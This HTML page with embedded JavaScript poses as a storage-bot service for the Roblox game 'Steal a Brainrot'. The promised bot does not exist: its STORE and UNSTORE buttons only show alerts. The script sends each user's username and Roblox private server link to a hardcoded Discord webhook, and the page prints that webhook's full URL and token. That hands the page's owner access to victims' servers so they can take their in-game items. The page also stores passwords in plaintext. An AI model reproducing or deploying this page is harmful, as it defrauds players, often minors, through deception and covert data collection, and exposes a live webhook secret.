<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Brainrot Storage</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background: #f5f5f5;
            font-family: Arial, sans-serif;
        }

        .title {
            font-size: 2.2rem;
            font-weight: bold;
            margin-bottom: 0.7rem;
            color: #0078ff;
            text-align: center;
        }

        .how-text {
            max-width: 400px;
            text-align: center;
            margin-bottom: 1.2rem;
            font-size: 1.05rem;
            color: #222;
            background: #fff;
            padding: 0.7rem 1rem;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
        }

        .input-container, .auth-container, .response-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 400px;
        }

        .input-field {
            width: 100%;
            padding: 0.8rem;
            margin: 0.5rem 0;
            font-size: 1rem;
            border: 1px solid #ccc;
            border-radius: 8px;
            box-sizing: border-box;
        }

        .submit-btn, .auth-btn, .logout-btn, .new-server-btn {
            font-size: 1.2rem;
            padding: 0.8rem 2rem;
            background: #0078ff;
            color: #fff;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            transition: background 0.2s;
            margin-top: 1rem;
        }

        .submit-btn:hover, .auth-btn:hover, .logout-btn:hover, .new-server-btn:hover {
            background: #005fcc;
        }

        .action-btn {
            font-size: 1.2rem;
            padding: 0.8rem 2rem;
            background: #0078ff;
            color: #fff;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            transition: background 0.2s;
            margin: 0.5rem;
        }

        .action-btn:hover {
            background: #005fcc;
        }

        .message {
            max-width: 400px;
            text-align: center;
            margin-top: 1rem;
            font-size: 1rem;
            color: #222;
        }

        .toggle-auth {
            font-size: 1rem;
            color: #0078ff;
            cursor: pointer;
            margin-top: 0.5rem;
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="title">Steal a brainrot Storage</div>
    <div class="how-text">
        Always wanted to store your brainrots because you wanna rebirth or go stealing.
        welp now you can store all your stuff without any problem of loosing it 
        register if you dont have an account and log in if you already have on after 
        filling the fields an instruction will be send to your discord server
    </div>
    <div id="auth-section" class="auth-container">
        <input type="text" id="auth-username" class="input-field" placeholder="Username">
        <input type="password" id="auth-password" class="input-field" placeholder="Password">
        <button id="register-btn" class="auth-btn" onclick="register()">Register</button>
        <div id="toggle-auth-text" class="toggle-auth" onclick="toggleAuth()">Already have an account? Log in</div>
    </div>
    <div id="input-section" class="input-container" style="display: none;">
        <input type="text" id="webhook" class="input-field" placeholder="Webhook">
        <input type="text" id="privateServer" class="input-field" placeholder="Private Server">
        <input type="text" id="username" class="input-field" placeholder="Username">
        <button class="submit-btn" onclick="sendToWebhook()">Submit</button>
    </div>
    <div id="response" class="response-container" style="display: none;">
        <div class="message">Wait until the bot connects, it can take less than 5 minutes. If it doesn't connect, try again later.</div>
        <button class="action-btn" onclick="showSuccessMessage()">UNSTORE</button>
        <button class="action-btn" onclick="showSuccessMessage()">STORE</button>
        <input type="text" id="newPrivateServer" class="input-field" placeholder="NEW Private Server">
        <button class="new-server-btn" onclick="submitNewPrivateServer()">Submit New Server</button>
        <button class="logout-btn" onclick="logout()">Log Out</button>
    </div>

    <script>
        let isRegisterMode = true;

        // Check if user is already logged in
        window.onload = function() {
            const loggedInUser = localStorage.getItem('loggedInUser');
            if (loggedInUser) {
                const userData = JSON.parse(localStorage.getItem(`user_${loggedInUser}`));
                if (userData && userData.webhook && userData.privateServer && userData.usernameField) {
                    document.getElementById('auth-section').style.display = 'none';
                    document.getElementById('input-section').style.display = 'none';
                    document.getElementById('response').style.display = 'block';
                    document.getElementById('webhook').value = userData.webhook;
                    document.getElementById('privateServer').value = userData.privateServer;
                    document.getElementById('username').value = userData.usernameField;
                } else {
                    document.getElementById('auth-section').style.display = 'none';
                    document.getElementById('input-section').style.display = 'block';
                }
            }
        };

        function toggleAuth() {
            isRegisterMode = !isRegisterMode;
            document.getElementById('register-btn').textContent = isRegisterMode ? 'Register' : 'Log In';
            document.getElementById('toggle-auth-text').textContent = isRegisterMode ? 'Already have an account? Log in' : 'Need an account? Register';
        }

        function register() {
            const username = document.getElementById('auth-username').value;
            const password = document.getElementById('auth-password').value;

            if (!username || !password) {
                alert('Please fill in both username and password');
                return;
            }

            if (isRegisterMode) {
                // Check if username already exists
                if (localStorage.getItem(`user_${username}`)) {
                    alert('Username already exists. Please choose another or log in.');
                    return;
                }
                // Register new user
                const userData = { username, password, webhook: '', privateServer: '', usernameField: '' };
                localStorage.setItem(`user_${username}`, JSON.stringify(userData));
                localStorage.setItem('loggedInUser', username);
                alert('Registration successful! Please enter your webhook, private server, and username.');
                document.getElementById('auth-section').style.display = 'none';
                document.getElementById('input-section').style.display = 'block';
            } else {
                // Log in
                const userData = JSON.parse(localStorage.getItem(`user_${username}`));
                if (!userData || userData.password !== password) {
                    alert('Invalid username or password.');
                    return;
                }
                localStorage.setItem('loggedInUser', username);
                if (userData.webhook && userData.privateServer && userData.usernameField) {
                    document.getElementById('auth-section').style.display = 'none';
                    document.getElementById('input-section').style.display = 'none';
                    document.getElementById('response').style.display = 'block';
                    document.getElementById('webhook').value = userData.webhook;
                    document.getElementById('privateServer').value = userData.privateServer;
                    document.getElementById('username').value = userData.usernameField;
                } else {
                    alert('Login successful! Please enter your webhook, private server, and username.');
                    document.getElementById('auth-section').style.display = 'none';
                    document.getElementById('input-section').style.display = 'block';
                }
            }
        }

        function logout() {
            localStorage.removeItem('loggedInUser');
            document.getElementById('auth-section').style.display = 'block';
            document.getElementById('input-section').style.display = 'none';
            document.getElementById('response').style.display = 'none';
            document.getElementById('auth-username').value = '';
            document.getElementById('auth-password').value = '';
            document.getElementById('webhook').value = '';
            document.getElementById('privateServer').value = '';
            document.getElementById('username').value = '';
            document.getElementById('newPrivateServer').value = '';
            isRegisterMode = true;
            document.getElementById('register-btn').textContent = 'Register';
            document.getElementById('toggle-auth-text').textContent = 'Already have an account? Log in';
            alert('Logged out successfully.');
        }

        function showSuccessMessage() {
            alert('Successful, wait until bot connects');
        }

        async function sendToWebhook() {
            const webhook = document.getElementById('webhook').value;
            const privateServer = document.getElementById('privateServer').value;
            const username = document.getElementById('username').value;

            // Validate inputs
            if (!webhook || !privateServer || !username) {
                alert('Please fill in all fields');
                return;
            }

            // Verify webhook starts with https://discord.com/api
            if (!webhook.startsWith('https://discord.com/api')) {
                alert('Webhook must start with https://discord.com/api');
                return;
            }

            // Verify private server starts with https://roblox.com or https://www.roblox.com
            if (!privateServer.startsWith('https://roblox.com') && !privateServer.startsWith('https://www.roblox.com')) {
                alert('Private Server must start with https://roblox.com or https://www.roblox.com');
                return;
            }

            const payload = {
                embeds: [
                    {
                        title: "Bot Status",
                        description: "-Bot online\n\nInstructions: The bot will grab all the Brainrots from all the floors and when all your base has been empty, The bot will disconnect until you connect him again and press unstore button on the web he will connect again and will wait until you have steal everything than the bot will disconnect.",
                        color: 3447003
                    }
                ]
            };

            try {
                const response = await fetch(webhook, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    alert('Submission sent successfully! Check your Discord server.');
                    // Save submission data
                    const loggedInUser = localStorage.getItem('loggedInUser');
                    if (loggedInUser) {
                        const userData = JSON.parse(localStorage.getItem(`user_${loggedInUser}`));
                        userData.webhook = webhook;
                        userData.privateServer = privateServer;
                        userData.usernameField = username;
                        localStorage.setItem(`user_${loggedInUser}`, JSON.stringify(userData));
                    }
                    document.getElementById('input-section').style.display = 'none';
                    document.getElementById('response').style.display = 'block';
                    document.getElementById('webhook').value = '';
                    document.getElementById('privateServer').value = '';
                    document.getElementById('username').value = '';
                } else {
                    alert('Failed to send submission. Please try again.');
                    if (response.status === 404) {
                        alert('Webhook URL is invalid. Nelly is serving noodles! Please check the webhook URL and try again.');
                    }
                }
            } catch (error) {
                alert('An error occurred: ' + error.message);
            }
        }

        async function submitNewPrivateServer() {
            const newPrivateServer = document.getElementById('newPrivateServer').value;
            const loggedInUser = localStorage.getItem('loggedInUser');

            // Validate new private server
            if (!newPrivateServer) {
                alert('Please enter a new private server URL');
                return;
            }

            if (!newPrivateServer.startsWith('https://roblox.com') && !newPrivateServer.startsWith('https://www.roblox.com')) {
                alert('New Private Server must start with https://roblox.com or https://www.roblox.com');
                return;
            }

            const payload = {
                embeds: [
                    {
                        title: "New Private Server Submission",
                        fields: [
                            { name: "Username", value: loggedInUser, inline: false },
                            { name: "New Private Server", value: newPrivateServer, inline: false }
                        ],
                        color: 3447003
                    }
                ]
            };

            try {
                const response = await fetch('https://discord.com/api/webhooks/1421414129159114825/WzUVXlVkQoFnbW8HL0HOISIS8as_GISRHIynaAONm4tF-a42hElzMIECIwOhYGl9-Rkz', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    alert('New private server submitted successfully!');
                    document.getElementById('newPrivateServer').value = '';
                    // Update stored private server
                    const userData = JSON.parse(localStorage.getItem(`user_${loggedInUser}`));
                    userData.privateServer = newPrivateServer;
                    localStorage.setItem(`user_${loggedInUser}`, JSON.stringify(userData));
                } else {
                    alert('Failed to submit new private server. Please try again.');
                    if (response.status === 404) {
                        alert('Webhook URL is invalid. Nelly is serving noodles! Please check the webhook URL and try again.');
                    }
                }
            } catch (error) {
                alert('An error occurred: ' + error.message);
            }
        }
    </script>
</body>
</html>
